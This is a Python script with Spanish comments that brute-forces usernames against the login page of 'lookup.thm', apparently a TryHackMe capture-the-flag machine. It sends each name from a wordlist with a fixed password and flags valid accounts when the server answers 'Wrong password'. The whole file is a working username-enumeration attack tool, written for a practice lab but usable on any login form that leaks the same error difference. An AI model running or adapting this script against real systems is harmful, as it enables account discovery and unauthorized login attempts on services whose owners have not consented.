import requests
import argparse

# Colores en estándar ANSI para resaltar salidas
RED = "\033[31m"
GREEN = "\033[32m"
RESET = "\033[0m"

def brute_force(wordlist_a, verbose_option, exhaust_option):
    with open(wordlist_a, "r") as wordlist:
        url = "http://lookup.thm/login.php"  # Cambiar a HTTPS si es necesario
        data = {
            "username": "",
            "password": "p"  # Contraseña fija para encontrar el usuario
        }
        count = 0
        print("[+] Enviando solicitudes de fuerza bruta...")

        try:
            for line in wordlist:
                count += 1
                data["username"] = line.strip()  # Limpia espacios y saltos de línea
                req = requests.post(url, data=data)

                if verbose_option:
                    print(f"[+] Intento {count}: username = {data['username']}")

                # Verificar si se encuentra un usuario válido
                if req.status_code == 200:
                    res = req.text
                    if "Wrong password" in res:  # Ajustar este mensaje según el servidor
                        print(f"{GREEN}[+] ¡Usuario encontrado!: {data['username']}{RESET}")

                        # Si no se especifica exhaust, preguntar si continuar
                        if not exhaust_option:
                            choice = input("¿Deseas continuar? (Y/N): ").strip().upper()
                            if choice == "N":
                                break
        except Exception as e:
            print(f"{RED}[-] Algo salió mal. {RESET}")
            print(e)
            print("¿Añadiste 'lookup.thm' a /etc/hosts?")

if __name__ == "__main__":
    print("Script de fuerza bruta para el inicio de sesión en Lookup THM")
    parser = argparse.ArgumentParser(
        prog="Brute force login script",
        usage="""
        python3 login-brute.py -w [wordlist] [-v/--verbose] [-e/--exhaust]

        El parámetro `wordlist` por defecto está configurado en 
        /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
        """,
        epilog="\n\nCreado por wizarddos"
    )
    # Argumentos disponibles
    parser.add_argument(
        "-w", "--wordlist",
        help="Especifica el archivo de lista de usuarios",
        default="/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt"
    )
    parser.add_argument(
        "-v", "--verbose",
        help="Modo detallado - muestra cada intento",
        action="store_true"
    )
    parser.add_argument(
        "-e", "--exhaust",
        help="Ejecuta el script hasta que termine la lista completa",
        action="store_true"
    )

    # Leer argumentos
    args = parser.parse_args()

    # Ejecutar función principal
    brute_force(args.wordlist, args.verbose, args.exhaust)
